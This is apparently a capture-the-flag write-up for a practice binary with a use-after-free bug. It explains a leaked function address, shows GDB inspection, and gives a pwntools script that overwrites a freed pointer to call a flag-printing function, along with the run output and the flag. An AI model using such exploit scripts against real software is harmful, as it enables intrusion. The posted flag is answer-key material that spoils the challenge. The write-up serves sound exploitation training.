Ths programs starts with this:<br>
<img width="390" height="126" alt="image" src="https://github.com/user-attachments/assets/9c7fda56-b5d9-4e20-b52e-2af002de81ae" />
<br>
Subscribing to the channel will result in a memory leak:<br>
<img width="337" height="29" alt="image" src="https://github.com/user-attachments/assets/607fdb73-7819-4abd-8a71-dbcc049e282c" />
<br>
From the function below, it can be seen that leaked memory address is for the function hahaexploitgobrrr()
<img width="892" height="99" alt="image" src="https://github.com/user-attachments/assets/7c984be9-a452-4da2-9762-068dd7571692" />
This function contains the flag:<br>
<img width="418" height="229" alt="image" src="https://github.com/user-attachments/assets/df940c75-90a1-4932-bfe0-17f463542c08" />
<br>
The function below shows that function that inputs the username
<br>

    char * getsline(void) {
    	getchar();
    	char * line = malloc(100), * linep = line;
    	size_t lenmax = 100, len = lenmax;
    	int c;
    	if(line == NULL)
    		return NULL;
    	for(;;) {
    		c = fgetc(stdin);
    		if(c == EOF)
    			break;
    		if(--len == 0) {
    			len = lenmax;
    			char * linen = realloc(linep, lenmax *= 2);

			if(linen == NULL) {
				free(linep);
				return NULL;
			}
			line = linen + (line - linep);
			linep = linen;
		}

		if((*line++ = c) == '\n')
			break;
	}
	*line = '\0';
	return linep;
    }
<br>
It shows that the function stores the username dynamically.
<br>
The function below handles the deletion of an account
<br>
<img width="597" height="339" alt="image" src="https://github.com/user-attachments/assets/059ef2f1-a27c-4ee4-930a-812ff5b0c2d8" />
<br>
As can be seen from the function above, the function frees the dynamically allocated memory from the heap. This is a potential vulnerability that can be used later on.
<br>
The function below is the function for leaving messages. Take note that it also stores text dynamically
<br>
<img width="673" height="189" alt="image" src="https://github.com/user-attachments/assets/eef5b605-5516-46d2-90ad-b0e970bfc18a" />
<br>
<b>Thought Process</b>
When we attempt to leave a message without creating an account, it results in segmentation error
<br>
<img width="405" height="212" alt="image" src="https://github.com/user-attachments/assets/339ad738-0033-4718-961f-2de461b8426c" />
<br>
However, GDB can be used to inspect the segmentation error.<br>
<img width="942" height="599" alt="image" src="https://github.com/user-attachments/assets/891ee37c-7f95-4404-afa7-595d3c6a23b9" />
<br>
Nothing note worthy. However, freeing a dynamically allocated memory results in a vulnerabiliy, therefore an attempt to create an account and then freeing the account 
must be inspected.
<br>
<img width="472" height="634" alt="image" src="https://github.com/user-attachments/assets/3f7dbdd1-3889-4c5c-8338-4e42225b0812" />
<br><img width="918" height="589" alt="image" src="https://github.com/user-attachments/assets/aa0b98f8-0b72-48c4-a9e7-a322f1f869bd" />
<br>
Take note that the memory address of the function vuln is different than the previous attempt. Additionally, the hexadecimal '414141' corresponds 
to the ASCII 'AAA' which was the message left earlier. Meaning that changing the return address of the vuln function is possible.
This can be exploited by changing the address to the hahaexploitgobrrr() function which will result in the function being called 
in printing the flag.
This can be done by converting the address of the hahaexploutgobrrr() into ascii/bytes and feeding it into the buffer/message. This can be done using pwntools

    from pwn import *
    import time
    elf = ELF('./vuln')
    libc = elf.libc
    #p = process(elf.path)
    p.sendline('s')
    p.recvuntil("OOP! Memory leak...")
    leaks = p.recvline().strip().decode()
    leaks = leaks.split('\n')
    print(leaks[0])
    memory_address = int(leaks[0], 16)
    payload = p64(memory_address)
    time.sleep(1)
    p.sendline('m')
    time.sleep(1)
    p.sendline('prince')
    time.sleep(1)
    p.sendline('i')
    time.sleep(1)
    p.sendline('y')
    time.sleep(1)
    p.sendline('l')
    time.sleep(1)
    p.sendline(payload)
    print(payload)
    p.interactive()

<br>
p.sendline('s') subscribes to the channel
p.recvuntil("OOP! Memory leak...") will get the memory leak
p64(memory_address) converts the memory address into ASCII or bytes
p.sendline('m') is to make an account
p.sendline('prince') to name the account 'prince'
p.sendline('i') to delete the account
p.sendline('y') to confirm the deletion
p.sendline('l') to leave a message
p.sendline(payload) to send the memory address that has been converted to ASCII/bytes

    $ python solve.py  
    [*] '/home/john/practicectf/vuln'
        Arch:       i386-32-little
        RELRO:      Partial RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        No PIE (0x8048000)
        Stripped:   No
    [*] '/usr/lib32/libc.so.6'
        Arch:       i386-32-little
        RELRO:      Full RELRO
        Stack:      Canary found
        NX:         NX enabled
        PIE:        PIE enabled
    [+] Starting local process '/home/john/practicectf/vuln': pid 214630
    /home/john/practicectf/solve.py:7: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('s')
    /home/john/practicectf/solve.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.recvuntil("OOP! Memory leak...")
    0x80487d6
    /home/john/practicectf/solve.py:15: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('m')
    /home/john/practicectf/solve.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('prince')
    /home/john/practicectf/solve.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('i')
    /home/john/practicectf/solve.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('y')
    /home/john/practicectf/solve.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
      p.sendline('l')
    b'\xd6\x87\x04\x08\x00\x00\x00\x00'
    [*] Switching to interactive mode
    Thanks for subsribing! I really recommend becoming a premium member!
    Welcome to my stream! ^W^
    ==========================
    (S)ubscribe to my channel
    (I)nquire about account deletion
    (M)ake an Twixer account
    (P)ay for premium membership
    (l)eave a message(with or without logging in)
    (e)xit
    ===========================
    Registration: Welcome to Twixer!
    Enter your username: 
    Account created.
    Welcome to my stream! ^W^
    ==========================
    (S)ubscribe to my channel
    (I)nquire about account deletion
    (M)ake an Twixer account
    (P)ay for premium membership
    (l)eave a message(with or without logging in)
    (e)xit
    You're leaving already(Y/N)?
    Bye!
    Welcome to my stream! ^W^
    ==========================
    (S)ubscribe to my channel
    (I)nquire about account deletion
    (M)ake an Twixer account
    (P)ay for premium membership
    (l)eave a message(with or without logging in)
    (e)xit
    I only read premium member messages but you can 
    try anyways:
    CITU{CWE_416_USE_AFTER_FREE}
    
    Welcome to my stream! ^W^
    ==========================
    (S)ubscribe to my channel
    (I)nquire about account deletion
    (M)ake an Twixer account
    (P)ay for premium membership
    (l)eave a message(with or without logging in)
    (e)xit
The flag has now been outputted
